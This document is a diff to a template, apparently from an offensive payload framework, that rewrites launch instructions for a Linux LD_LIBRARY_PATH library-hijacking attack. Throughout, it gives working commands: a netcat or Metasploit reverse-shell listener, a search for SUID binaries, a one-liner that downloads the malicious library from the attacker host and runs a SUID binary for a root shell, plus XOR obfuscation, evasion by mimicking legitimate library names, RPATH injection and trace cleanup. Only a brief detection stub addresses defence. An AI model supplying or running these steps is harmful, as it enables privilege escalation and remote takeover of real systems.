@@ -101,94 +101,43 @@ output:
   launch_instructions: |
     C Linux LD_LIBRARY_PATH Shared Library Hijacking - Launch Instructions
 
-    Step 1: Start Listener
-
-    On attacker machine:
+    Start Listener:
     nc -lvnp {{ lport }}
 
-    Or using Metasploit:
-    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+    Or with Metasploit:
+    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Step 2: Find SUID Binaries with Dynamic Libraries
-
-    On target, find SUID binaries:
+    Find SUID Binaries:
     find / -perm -u=s -type f 2>/dev/null
-
-    Check which libraries they use:
-    ldd /path/to/suid_binary
-
-    Identify hijackable libraries (those you can create malicious versions of).
-
-    Step 3: Transfer Malicious Library to Target
-
-    Transfer the generated shared library to the target Linux system:
-
-    Using Python HTTP server:
-    python3 -m http.server 8080
-
-    On target:
-    mkdir -p /tmp/lib
-    wget http://{{ lhost }}:8080/lib{{ target_library }}.so -O /tmp/lib/lib{{ target_library }}.so
-    chmod +x /tmp/lib/lib{{ target_library }}.so
-
-    Step 4: Hijack Library Load Path
-
-    Set LD_LIBRARY_PATH to point to malicious library directory:
-    export LD_LIBRARY_PATH=/tmp/lib:$LD_LIBRARY_PATH
-
-    Step 5: Execute SUID Binary
-
-    Run the SUID binary that loads your target library:
-    /path/to/suid_binary
-
-    If successful:
-    - Library constructor executes before main()
-    - setuid(0) escalates to root
-    - Shellcode executes with root privileges
-    - Reverse shell connects to your listener
-
-    Notes:
-
-    - Encrypted with XOR key 0x{{ xor_key }}
-    - Uses __attribute__((constructor)) for automatic execution
-    - Attempts privilege escalation via setuid(0)/setgid(0)
-    - Works on x64 Linux systems
-    - Requires SUID binary that loads the target library
-    - Some systems ignore LD_LIBRARY_PATH for SUID binaries (security feature)
-
-    Common Target Libraries:
-
-    - libgpgrt.so (GPG error library)
-    - libcrypto.so (OpenSSL crypto)
-    - libz.so (zlib compression)
-    - libpthread.so (POSIX threads)
-
-    Find SUID programs using specific library:
     for i in $(find / -perm -u=s -type f 2>/dev/null); do ldd $i 2>/dev/null | grep -q "{{ target_library }}" && echo $i; done
 
-    Evasion Tips:
+    Transfer and Execute:
+    python3 -m http.server 8080
+    On target: mkdir -p /tmp/lib && wget http://{{ lhost }}:8080/lib{{ target_library }}.so -O /tmp/lib/lib{{ target_library }}.so && chmod +x /tmp/lib/lib{{ target_library }}.so && export LD_LIBRARY_PATH=/tmp/lib:$LD_LIBRARY_PATH && /path/to/suid_binary
 
-    - Name library identically to legitimate one
-    - Match version numbers (libfoo.so.1.2.3)
-    - Include stub functions from original library (use objdump/nm to identify)
-    - Hide in unexpected but valid library paths
+    Notes:
+    - Target library: {{ target_library }} (must be loaded by SUID binary)
+    - XOR encrypted with key: 0x{{ xor_key }}
+    - Uses __attribute__((constructor)) for auto-execution before main()
+    - setuid(0)/setgid(0) escalates to root
+    - Reverse shell connects to {{ lhost }}:{{ lport }} with root privileges
+    - Works on x64 Linux systems
+    - Some systems ignore LD_LIBRARY_PATH for SUID binaries (security feature - check secure-mode)
+    - Common target libs: libgpgrt.so, libcrypto.so, libz.so, libpthread.so
+    - Alternative: RPATH injection if binary has writable RPATH (check: readelf -d /binary | grep RPATH)
+    - Name library identically to legitimate one, match version numbers (libfoo.so.1.2.3)
 
     Troubleshooting:
+    - Library not loaded: SUID binary may ignore LD_LIBRARY_PATH in secure mode
+    - No privilege escalation: setuid() fails if not SUID binary or SELinux/AppArmor blocks
+    - Symbol not found: Add stub functions matching target library (use objdump/nm to identify)
+    - No execution: Verify SUID binary actually loads target library with `ldd /path/to/suid_binary`
+    - Check /proc/self/maps after hijack to verify library loaded from /tmp/lib
 
-    - Library not loaded: SUID binary may ignore LD_LIBRARY_PATH (secure mode)
-    - No privilege escalation: setuid() may fail if not SUID binary
-    - Symbol not found errors: Add more stub functions matching target library
-    - No execution: Verify SUID binary actually loads your target library
-
-    Alternative - RPATH Injection:
-
-    Some binaries have RPATH set, which takes precedence:
-    Check RPATH:
-    readelf -d /path/to/binary | grep RPATH
-
-    If RPATH is writable, place malicious library there instead.
-
-    Detection:
+    Cleanup:
+    On target:
+    rm -f /tmp/lib/lib{{ target_library }}.so
+    unset LD_LIBRARY_PATH
 
     Defenders can detect this via:
     - Monitor LD_LIBRARY_PATH in process environment
